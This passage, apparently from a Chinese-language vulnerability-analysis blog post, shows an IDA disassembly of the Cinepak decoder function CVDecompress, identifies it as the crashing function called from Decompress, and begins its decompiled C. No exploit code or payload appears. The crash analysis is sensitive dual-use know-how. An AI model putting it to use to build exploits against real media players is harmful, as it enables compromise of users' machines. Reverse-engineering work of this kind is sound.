dword ptr  20h</span><br><span class="line">.text:73B721AE</span><br><span class="line">.text:73B721AE 8B FF                         mov     edi, edi</span><br><span class="line">.text:73B721B0 55                            push    ebp</span><br><span class="line">.text:73B721B1 8B EC                         mov     ebp, esp</span><br><span class="line">.text:73B721B3 83 EC 20                      sub     esp, 20h</span><br><span class="line">.text:73B721B6 53                            push    ebx</span><br><span class="line">.text:73B721B7 8B 5D 08                      mov     ebx, [ebp+arg_0]</span><br><span class="line">.text:73B721BA 56                            push    esi</span><br><span class="line">.text:73B721BB 8B 73 24                      mov     esi, [ebx+24h]</span><br><span class="line">.text:73B721BE 57                            push    edi</span><br><span class="line">.text:73B721BF 33 FF                         xor     edi, edi</span><br><span class="line">.text:73B721C1 3B F7                         cmp     esi, edi</span><br><span class="line">.text:73B721C3 74 1C                         jz      short loc_73B721E1</span><br><span class="line">.text:73B721C3</span><br><span class="line">.text:73B721C5 FF 75 20                      push    [ebp+arg_18]                    ; int</span><br><span class="line">.text:73B721C8 89 7B 24                      mov     [ebx+24h], edi</span><br><span class="line">.text:73B721CB 57                            push    edi                             ; int</span><br><span class="line">.text:73B721CC 57                            push    edi                             ; int</span><br><span class="line">.text:73B721CD 57                            push    edi                             ; int</span><br><span class="line">.text:73B721CE 68 46 24 00 00                push    2446h                           ; int</span><br><span class="line">.text:73B721D3 56                            push    esi                             ; int</span><br><span class="line">.text:73B721D4 53                            push    ebx                             ; ULONG</span><br><span class="line">.text:73B721D5 E8 D4 FF FF FF                call    _CVDecompress@28                ; CVDecompress(x,x,x,x,x,x,x)</span><br><span class="line">.text:73B721D5</span><br><span class="line">.text:73B721DA 56                            push    esi                             ; hMem</span><br><span class="line">.text:73B721DB FF 15 40 10 B7 73             call    ds:__imp__LocalFree@4           ; LocalFree(x)</span><br><span class="line">.text:73B721DB</span><br><span class="line">.text:73B721E1</span><br><span class="line">.text:73B721E1                               loc_73B721E1:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15↑j</span><br><span class="line">.text:73B721E1 33 C0                         xor     eax, eax</span><br><span class="line">.text:73B721E3 83 7D 10 20                   cmp     [ebp+arg_8], 20h ; &#x27; &#x27;</span><br><span class="line">.text:73B721E7 0F 82 00 02 00 00             jb      loc_73B723ED</span><br><span class="line">.text:73B721E7</span><br><span class="line">.text:73B721ED 8B 75 0C                      mov     esi, [ebp+arg_4]</span><br><span class="line">.text:73B721F0 8A 66 01                      mov     ah, [esi+1]</span><br><span class="line">.text:73B721F3 0F B6 4E 03                   movzx   ecx, byte ptr [esi+3]</span><br><span class="line">.text:73B721F7 8A 46 02                      mov     al, [esi+2]</span><br><span class="line">.text:73B721FA C1 E0 08                      shl     eax, 8</span><br><span class="line">.text:73B721FD 0B C1                         or      eax, ecx</span><br><span class="line">.text:73B721FF 39 45 10                      cmp     [ebp+arg_8], eax</span><br><span class="line">.text:73B72202 0F 8C EC 01 00 00             jl      loc_73B723F4</span><br><span class="line">.text:73B72202</span><br><span class="line">.text:73B72208 8A 0E                         mov     cl, [esi]</span><br><span class="line">.text:73B7220A 88 4D 13                      mov     byte ptr [ebp+arg_8+3], cl</span><br><span class="line">.text:73B7220D 8D 4D F0                      lea     ecx, [ebp+pulResult]</span><br><span class="line">.text:73B72210 51                            push    ecx                             ; pulResult</span><br><span class="line">.text:73B72211 6A 0A                         push    0Ah                             ; ulSubtrahend</span><br><span class="line">.text:73B72213 50                            push    eax                             ; ulMinuend</span><br><span class="line">.text:73B72214 E8 6D FF FF FF                call    _ULongSub@12                    ; ULongSub(x,x,x)</span><br><span class="line">.text:73B72214</span><br><span class="line">.text:73B72219 85 C0                         test    eax, eax</span><br><span class="line">.text:73B7221B 0F 8C D3 01 00 00             jl      loc_73B723F4</span><br><span class="line">.text:73B7221B</span><br><span class="line">.text:73B72221 33 C0                         xor     eax, eax</span><br><span class="line">.text:73B72223 8A 66 08                      mov     ah, [esi+8]</span><br><span class="line">.text:73B72226 83 C6 0A                      add     esi, 0Ah</span><br><span class="line">.text:73B72229 89 7D EC                      mov     [ebp+var_14], edi</span><br><span class="line">.text:73B7222C 89 75 E8                      mov     [ebp+var_18], esi</span><br><span class="line">.text:73B7222F 89 75 F4                      mov     [ebp+var_C], esi</span><br><span class="line">.text:73B72232 8A 46 FF                      mov     al, [esi-1]</span><br><span class="line">.text:73B72235 3B C7                         cmp     eax, edi</span><br><span class="line">.text:73B72237 89 45 E4                      mov     [ebp+var_1C], eax</span><br><span class="line">.text:73B7223A 0F 8E AA 01 00 00             jle     loc_73B723EA</span><br><span class="line">.text:73B7223A</span><br><span class="line">.text:73B72240 89 7D FC                      mov     [ebp+var_4], edi</span><br><span class="line">.text:73B72240</span><br><span class="line">.text:73B72243</span><br><span class="line">.text:73B72243                               loc_73B72243:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+236↓j</span><br><span class="line">.text:73B72243 8B 45 F0                      mov     eax, [ebp+pulResult]</span><br><span class="line">.text:73B72246 83 F8 16                      cmp     eax, 16h</span><br><span class="line">.text:73B72249 0F 82 9B 01 00 00             jb      loc_73B723EA</span><br><span class="line">.text:73B72249</span><br><span class="line">.text:73B7224F 0F B6 56 03                   movzx   edx, byte ptr [esi+3]</span><br><span class="line">.text:73B72253 33 C9                         xor     ecx, ecx</span><br><span class="line">.text:73B72255 8A 6E 01                      mov     ch, [esi+1]</span><br><span class="line">.text:73B72258 8A 4E 02                      mov     cl, [esi+2]</span><br><span class="line">.text:73B7225B C1 E1 08                      shl     ecx, 8</span><br><span class="line">.text:73B7225E 0B CA                         or      ecx, edx</span><br><span class="line">.text:73B72260 3B C1                         cmp     eax, ecx</span><br><span class="line">.text:73B72262 89 4D F8                      mov     [ebp+ulMinuend], ecx</span><br><span class="line">.text:73B72265 0F 82 7F 01 00 00             jb      loc_73B723EA</span><br><span class="line">.text:73B72265</span><br><span class="line">.text:73B7226B 8A 06                         mov     al, [esi]</span><br><span class="line">.text:73B7226D 3C 10                         cmp     al, 10h</span><br><span class="line">.text:73B7226F 74 08                         jz      short loc_73B72279</span><br><span class="line">.text:73B7226F</span><br><span class="line">.text:73B72271 3C 11                         cmp     al, 11h</span><br><span class="line">.text:73B72273 0F 85 57 01 00 00             jnz     loc_73B723D0</span><br><span class="line">.text:73B72273</span><br><span class="line">.text:73B72279</span><br><span class="line">.text:73B72279                               loc_73B72279:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+C1↑j</span><br><span class="line">.text:73B72279 8D 45 08                      lea     eax, [ebp+arg_0]</span><br><span class="line">.text:73B7227C 50                            push    eax                             ; pulResult</span><br><span class="line">.text:73B7227D 6A 0C                         push    0Ch                             ; ulSubtrahend</span><br><span class="line">.text:73B7227F FF 75 F8                      push    [ebp+ulMinuend]                 ; ulMinuend</span><br><span class="line">.text:73B72282 E8 FF FE FF FF                call    _ULongSub@12                    ; ULongSub(x,x,x)</span><br><span class="line">.text:73B72282</span><br><span class="line">.text:73B72287 85 C0                         test    eax, eax</span><br><span class="line">.text:73B72289 0F 8C 65 01 00 00             jl      loc_73B723F4</span><br><span class="line">.text:73B72289</span><br><span class="line">.text:73B7228F 33 C0                         xor     eax, eax</span><br><span class="line">.text:73B72291 8A 66 08                      mov     ah, [esi+8]</span><br><span class="line">.text:73B72294 33 C9                         xor     ecx, ecx</span><br><span class="line">.text:73B72296 8A 6E 04                      mov     ch, [esi+4]</span><br><span class="line">.text:73B72299 8A 46 09                      mov     al, [esi+9]</span><br><span class="line">.text:73B7229C 8A 4E 05                      mov     cl, [esi+5]</span><br><span class="line">.text:73B7229F 2B C1                         sub     eax, ecx</span><br><span class="line">.text:73B722A1 66 0F AF 43 2E                imul    ax, [ebx+2Eh]</span><br><span class="line">.text:73B722A6 89 45 0C                      mov     [ebp+arg_4], eax</span><br><span class="line">.text:73B722A9 8B 45 FC                      mov     eax, [ebp+var_4]</span><br><span class="line">.text:73B722AC 3B C7                         cmp     eax, edi</span><br><span class="line">.text:73B722AE 74 21                         jz      short loc_73B722D1</span><br><span class="line">.text:73B722AE</span><br><span class="line">.text:73B722B0 80 7D 13 00                   cmp     byte ptr [ebp+arg_8+3], 0</span><br><span class="line">.text:73B722B4 75 1B                         jnz     short loc_73B722D1</span><br><span class="line">.text:73B722B4</span><br><span class="line">.text:73B722B6 80 3E 11                      cmp     byte ptr [esi], 11h</span><br><span class="line">.text:73B722B9 75 16                         jnz     short loc_73B722D1</span><br><span class="line">.text:73B722B9</span><br><span class="line">.text:73B722BB 8B 4B 1C                      mov     ecx, [ebx+1Ch]</span><br><span class="line">.text:73B722BE 8D 3C 01                      lea     edi, [ecx+eax]</span><br><span class="line">.text:73B722C1 B9 00 08 00 00                mov     ecx, 800h</span><br><span class="line">.text:73B722C6 8D B7 00 E0 FF FF             lea     esi, [edi-2000h]</span><br><span class="line">.text:73B722CC F3 A5                         rep movsd</span><br><span class="line">.text:73B722CE 8B 75 E8                      mov     esi, [ebp+var_18]</span><br><span class="line">.text:73B722CE</span><br><span class="line">.text:73B722D1</span><br><span class="line">.text:73B722D1                               loc_73B722D1:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+100↑j</span><br><span class="line">.text:73B722D1                                                                       ; CVDecompress(x,x,x,x,x,x,x)+106↑j</span><br><span class="line">.text:73B722D1                                                                       ; CVDecompress(x,x,x,x,x,x,x)+10B↑j</span><br><span class="line">.text:73B722D1 8B 7D F4                      mov     edi, [ebp+var_C]</span><br><span class="line">.text:73B722D4 8B 43 20                      mov     eax, [ebx+20h]</span><br><span class="line">.text:73B722D7 83 C7 0C                      add     edi, 0Ch</span><br><span class="line">.text:73B722DA 03 45 FC                      add     eax, [ebp+var_4]</span><br><span class="line">.text:73B722DD 8D 4E 0C                      lea     ecx, [esi+0Ch]</span><br><span class="line">.text:73B722E0 89 43 38                      mov     [ebx+38h], eax</span><br><span class="line">.text:73B722E3 8B 45 20                      mov     eax, [ebp+arg_18]</span><br><span class="line">.text:73B722E6 89 4D E8                      mov     [ebp+var_18], ecx</span><br><span class="line">.text:73B722E9 89 43 3C                      mov     [ebx+3Ch], eax</span><br><span class="line">.text:73B722EC E9 BE 00 00 00                jmp     loc_73B723AF</span><br><span class="line">.text:73B722EC</span><br><span class="line">.text:73B722F1                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:73B722F1</span><br><span class="line">.text:73B722F1                               loc_73B722F1:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+205↓j</span><br><span class="line">.text:73B722F1 0F B6 41 03                   movzx   eax, byte ptr [ecx+3]</span><br><span class="line">.text:73B722F5 33 D2                         xor     edx, edx</span><br><span class="line">.text:73B722F7 8A 71 01                      mov     dh, [ecx+1]</span><br><span class="line">.text:73B722FA 8A 51 02                      mov     dl, [ecx+2]</span><br><span class="line">.text:73B722FD C1 E2 08                      shl     edx, 8</span><br><span class="line">.text:73B72300 0B D0                         or      edx, eax</span><br><span class="line">.text:73B72302 39 55 08                      cmp     [ebp+arg_0], edx</span><br><span class="line">.text:73B72305 89 55 E0                      mov     [ebp+var_20], edx</span><br><span class="line">.text:73B72308 0F 82 AB 00 00 00             jb      loc_73B723B9</span><br><span class="line">.text:73B72308</span><br><span class="line">.text:73B7230E 0F B6 01                      movzx   eax, byte ptr [ecx]</span><br><span class="line">.text:73B72311 83 C0 E0                      add     eax, 0FFFFFFE0h                 ; switch 19 cases</span><br><span class="line">.text:73B72314 83 F8 12                      cmp     eax, 12h</span><br><span class="line">.text:73B72317 77 7D                         ja      short def_73B72320              ; jumptable 73B72320 default case, cases 40-47</span><br><span class="line">.text:73B72317</span><br><span class="line">.text:73B72319 0F B6 80 10 24 B7 73          movzx   eax, ds:byte_73B72410[eax]</span><br><span class="line">.text:73B72320 FF 24 85 F8 23 B7 73          jmp     ds:jpt_73B72320[eax*4]          ; switch jump</span><br><span class="line">.text:73B72320</span><br><span class="line">.text:73B72327                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:73B72327</span><br><span class="line">.text:73B72327                               loc_73B72327:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j</span><br><span class="line">.text:73B72327                                                                       ; DATA XREF: .text:jpt_73B72320↓o</span><br><span class="line">.text:73B72327 FF 73 30                      push    dword ptr [ebx+30h]             ; jumptable 73B72320 cases 32,33,36,37</span><br><span class="line">.text:73B7232A FF 73 34                      push    dword ptr [ebx+34h]</span><br><span class="line">.text:73B7232D FF 73 38                      push    dword ptr [ebx+38h]</span><br><span class="line">.text:73B72330 57                            push    edi</span><br><span class="line">.text:73B72331 FF 13                         call    dword ptr [ebx]</span><br><span class="line">.text:73B72331</span><br><span class="line">.text:73B72333 EB 61                         jmp     short def_73B72320              ; jumptable 73B72320 default case, cases 40-47</span><br><span class="line">.text:73B72333</span><br><span class="line">.text:73B72335                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:73B72335</span><br><span class="line">.text:73B72335                               loc_73B72335:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j</span><br><span class="line">.text:73B72335                                                                       ; DATA XREF: .text:jpt_73B72320↓o</span><br><span class="line">.text:73B72335 FF 73 30                      push    dword ptr [ebx+30h]             ; jumptable 73B72320 cases 34,35,38,39</span><br><span class="line">.text:73B72338 8B 43 38                      mov     eax, [ebx+38h]</span><br><span class="line">.text:73B7233B FF 73 34                      push    dword ptr [ebx+34h]</span><br><span class="line">.text:73B7233E 05 00 10 00 00                add     eax, 1000h</span><br><span class="line">.text:73B72343 50                            push    eax</span><br><span class="line">.text:73B72344 57                            push    edi</span><br><span class="line">.text:73B72345 FF 53 04                      call    dword ptr [ebx+4]</span><br><span class="line">.text:73B72345</span><br><span class="line">.text:73B72348 EB 4C                         jmp     short def_73B72320              ; jumptable 73B72320 default case, cases 40-47</span><br><span class="line">.text:73B72348</span><br><span class="line">.text:73B7234A                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:73B7234A</span><br><span class="line">.text:73B7234A                               loc_73B7234A:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j</span><br><span class="line">.text:73B7234A                                                                       ; DATA XREF: .text:jpt_73B72320↓o</span><br><span class="line">.text:73B7234A FF 75 0C                      push    [ebp+arg_4]                     ; jumptable 73B72320 case 48</span><br><span class="line">.text:73B7234D 83 C2 FC                      add     edx, 0FFFFFFFCh</span><br><span class="line">.text:73B72350 FF 75 1C                      push    [ebp+arg_14]</span><br><span class="line">.text:73B72353 8D 47 04                      lea     eax, [edi+4]</span><br><span class="line">.text:73B72356 FF 75 18                      push    [ebp+arg_10]</span><br><span class="line">.text:73B72359 FF 75 14                      push    [ebp+arg_C]</span><br><span class="line">.text:73B7235C 52                            push    edx</span><br><span class="line">.text:73B7235D 50                            push    eax</span><br><span class="line">.text:73B7235E 53                            push    ebx</span><br><span class="line">.text:73B7235F FF 53 08                      call    dword ptr [ebx+8]</span><br><span class="line">.text:73B7235F</span><br><span class="line">.text:73B72362 EB 32                         jmp     short def_73B72320              ; jumptable 73B72320 default case, cases 40-47</span><br><span class="line">.text:73B72362</span><br><span class="line">.text:73B72364                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:73B72364</span><br><span class="line">.text:73B72364                               loc_73B72364:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j</span><br><span class="line">.text:73B72364                                                                       ; DATA XREF: .text:jpt_73B72320↓o</span><br><span class="line">.text:73B72364 FF 75 0C                      push    [ebp+arg_4]                     ; jumptable 73B72320 case 49</span><br><span class="line">.text:73B72367 83 C2 FC                      add     edx, 0FFFFFFFCh</span><br><span class="line">.text:73B7236A FF 75 1C                      push    [ebp+arg_14]</span><br><span class="line">.text:73B7236D 8D 47 04                      lea     eax, [edi+4]</span><br><span class="line">.text:73B72370 FF 75 18                      push    [ebp+arg_10]</span><br><span class="line">.text:73B72373 FF 75 14                      push    [ebp+arg_C]</span><br><span class="line">.text:73B72376 52                            push    edx</span><br><span class="line">.text:73B72377 50                            push    eax</span><br><span class="line">.text:73B72378 53                            push    ebx</span><br><span class="line">.text:73B72379 FF 53 10                      call    dword ptr [ebx+10h]</span><br><span class="line">.text:73B72379</span><br><span class="line">.text:73B7237C EB 18                         jmp     short def_73B72320              ; jumptable 73B72320 default case, cases 40-47</span><br><span class="line">.text:73B7237C</span><br><span class="line">.text:73B7237E                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:73B7237E</span><br><span class="line">.text:73B7237E                               loc_73B7237E:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+172↑j</span><br><span class="line">.text:73B7237E                                                                       ; DATA XREF: .text:jpt_73B72320↓o</span><br><span class="line">.text:73B7237E FF 75 0C                      push    [ebp+arg_4]                     ; jumptable 73B72320 case 50</span><br><span class="line">.text:73B72381 83 C2 FC                      add     edx, 0FFFFFFFCh</span><br><span class="line">.text:73B72384 FF 75 1C                      push    [ebp+arg_14]</span><br><span class="line">.text:73B72387 8D 47 04                      lea     eax, [edi+4]</span><br><span class="line">.text:73B7238A FF 75 18                      push    [ebp+arg_10]</span><br><span class="line">.text:73B7238D FF 75 14                      push    [ebp+arg_C]</span><br><span class="line">.text:73B72390 52                            push    edx</span><br><span class="line">.text:73B72391 50                            push    eax</span><br><span class="line">.text:73B72392 53                            push    ebx</span><br><span class="line">.text:73B72393 FF 53 0C                      call    dword ptr [ebx+0Ch]</span><br><span class="line">.text:73B72393</span><br><span class="line">.text:73B72396</span><br><span class="line">.text:73B72396                               def_73B72320:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+169↑j</span><br><span class="line">.text:73B72396                                                                       ; CVDecompress(x,x,x,x,x,x,x)+172↑j</span><br><span class="line">.text:73B72396                                                                       ; CVDecompress(x,x,x,x,x,x,x)+185↑j</span><br><span class="line">.text:73B72396                                                                       ; CVDecompress(x,x,x,x,x,x,x)+19A↑j</span><br><span class="line">.text:73B72396                                                                       ; CVDecompress(x,x,x,x,x,x,x)+1B4↑j</span><br><span class="line">.text:73B72396                                                                       ; CVDecompress(x,x,x,x,x,x,x)+1CE↑j</span><br><span class="line">.text:73B72396                                                                       ; DATA XREF: .text:jpt_73B72320↓o</span><br><span class="line">.text:73B72396 8B 55 E0                      mov     edx, [ebp+var_20]               ; jumptable 73B72320 default case, cases 40-47</span><br><span class="line">.text:73B72399 8B 4D E8                      mov     ecx, [ebp+var_18]</span><br><span class="line">.text:73B7239C 33 C0                         xor     eax, eax</span><br><span class="line">.text:73B7239E 03 CA                         add     ecx, edx</span><br><span class="line">.text:73B723A0 40                            inc     eax</span><br><span class="line">.text:73B723A1 03 FA                         add     edi, edx</span><br><span class="line">.text:73B723A3 3B D0                         cmp     edx, eax</span><br><span class="line">.text:73B723A5 89 4D E8                      mov     [ebp+var_18], ecx</span><br><span class="line">.text:73B723A8 76 02                         jbe     short loc_73B723AC</span><br><span class="line">.text:73B723A8</span><br><span class="line">.text:73B723AA 8B C2                         mov     eax, edx</span><br><span class="line">.text:73B723AA</span><br><span class="line">.text:73B723AC</span><br><span class="line">.text:73B723AC                               loc_73B723AC:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+1FA↑j</span><br><span class="line">.text:73B723AC 29 45 08                      sub     [ebp+arg_0], eax</span><br><span class="line">.text:73B723AC</span><br><span class="line">.text:73B723AF</span><br><span class="line">.text:73B723AF                               loc_73B723AF:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+13E↑j</span><br><span class="line">.text:73B723AF 83 7D 08 04                   cmp     [ebp+arg_0], 4</span><br><span class="line">.text:73B723B3 0F 83 38 FF FF FF             jnb     loc_73B722F1</span><br><span class="line">.text:73B723B3</span><br><span class="line">.text:73B723B9</span><br><span class="line">.text:73B723B9                               loc_73B723B9:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15A↑j</span><br><span class="line">.text:73B723B9 0F BF 45 0C                   movsx   eax, word ptr [ebp+arg_4]</span><br><span class="line">.text:73B723BD 0F AF 45 20                   imul    eax, [ebp+arg_18]</span><br><span class="line">.text:73B723C1 01 45 1C                      add     [ebp+arg_14], eax</span><br><span class="line">.text:73B723C4 FF 45 EC                      inc     [ebp+var_14]</span><br><span class="line">.text:73B723C7 81 45 FC 00 20 00 00          add     [ebp+var_4], 2000h</span><br><span class="line">.text:73B723CE 33 FF                         xor     edi, edi</span><br><span class="line">.text:73B723CE</span><br><span class="line">.text:73B723D0</span><br><span class="line">.text:73B723D0                               loc_73B723D0:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+C5↑j</span><br><span class="line">.text:73B723D0 8B 45 F8                      mov     eax, [ebp+ulMinuend]</span><br><span class="line">.text:73B723D3 01 45 F4                      add     [ebp+var_C], eax</span><br><span class="line">.text:73B723D6 29 45 F0                      sub     [ebp+pulResult], eax</span><br><span class="line">.text:73B723D9 03 F0                         add     esi, eax</span><br><span class="line">.text:73B723DB 8B 45 E4                      mov     eax, [ebp+var_1C]</span><br><span class="line">.text:73B723DE 39 45 EC                      cmp     [ebp+var_14], eax</span><br><span class="line">.text:73B723E1 89 75 E8                      mov     [ebp+var_18], esi</span><br><span class="line">.text:73B723E4 0F 8C 59 FE FF FF             jl      loc_73B72243</span><br><span class="line">.text:73B723E4</span><br><span class="line">.text:73B723EA</span><br><span class="line">.text:73B723EA                               loc_73B723EA:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+8C↑j</span><br><span class="line">.text:73B723EA                                                                       ; CVDecompress(x,x,x,x,x,x,x)+9B↑j</span><br><span class="line">.text:73B723EA                                                                       ; CVDecompress(x,x,x,x,x,x,x)+B7↑j</span><br><span class="line">.text:73B723EA 33 C0                         xor     eax, eax</span><br><span class="line">.text:73B723EC 40                            inc     eax</span><br><span class="line">.text:73B723EC</span><br><span class="line">.text:73B723ED</span><br><span class="line">.text:73B723ED                               loc_73B723ED:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+39↑j</span><br><span class="line">.text:73B723ED                                                                       ; CVDecompress(x,x,x,x,x,x,x)+248↓j</span><br><span class="line">.text:73B723ED 5F                            pop     edi</span><br><span class="line">.text:73B723EE 5E                            pop     esi</span><br><span class="line">.text:73B723EF 5B                            pop     ebx</span><br><span class="line">.text:73B723F0 C9                            leave</span><br><span class="line">.text:73B723F1 C2 1C 00                      retn    1Ch</span><br></pre></td></tr></table></figure></div><p>崩溃函数为 CVDecompress, 其主调函数为 Decompress 。对 CVDecompress 函数反编译得到</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">CVDecompress</span><span class="params">(ULONG a1, _BYTE *a2, <span class="type">unsigned</span> <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, <span class="type">int</span> a6, <span class="type">int</span> a7)</span></span><br><span class="line">&#123;</span><br><span class="line">  ULONG v7; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v12; <span class="comment">// ax</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v14; <span class="comment">// cx</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v15; <span class="comment">// ax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v16; <span class="comment">// cx</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v18; <span class="comment">// edi</span></span><br><span class="line">  _BYTE *v19; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v20; <span class="comment">// dx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v21; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [esp-4h] [ebp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v24; <span class="comment">// [esp+Ch] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [esp+10h] [ebp-1Ch]</span></span><br><span class="line">  _BYTE *v26; <span class="comment">// [esp+14h] [ebp-18h]</span></span><br><span class="line">  _BYTE *v27; <span class="comment">// [esp+14h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// [esp+18h] [ebp-14h]</span></span><br><span class="line">  ULONG pulResult; <span class="comment">// [esp+1Ch] [ebp-10h] BYREF</span></span><br><span class="line">  _BYTE *v30; <span class="comment">// [esp+20h] [ebp-Ch]</span></span><br><span class="line">  ULONG ulMinuend; <span class="comment">// [esp+24h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [esp+28h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v8 = *(<span class="type">void</span> **)(a1 + <span class="number">36</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    v23 = a7;</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">36</span>) = <span class="number">0</span>;</span><br><span class="line">    CVDecompress(v7, (<span class="type">int</span>)v8, <span class="number">9286</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, v23);</span><br><span class="line">    LocalFree(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span 